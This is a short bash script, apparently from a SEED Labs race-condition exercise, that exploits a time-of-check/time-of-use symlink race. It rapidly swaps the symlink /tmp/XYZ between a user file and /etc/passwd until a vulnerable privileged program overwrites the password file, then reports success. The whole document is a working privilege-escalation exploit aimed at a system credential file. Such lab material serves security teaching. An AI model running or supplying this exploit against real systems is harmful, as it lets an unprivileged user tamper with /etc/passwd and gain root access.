#!/bin/bash
CHECK_FILE="ls -l /etc/passwd"
old=$($CHECK_FILE)
new=$($CHECK_FILE)
while [ "$old" == "$new" ]
do
	ln -sf /home/seed/Desktop/lab4/temp /tmp/XYZ
	ln -sf /etc/passwd /tmp/XYZ
	new=$($CHECK_FILE)
done
echo "STOP... The passwd file has been changed"
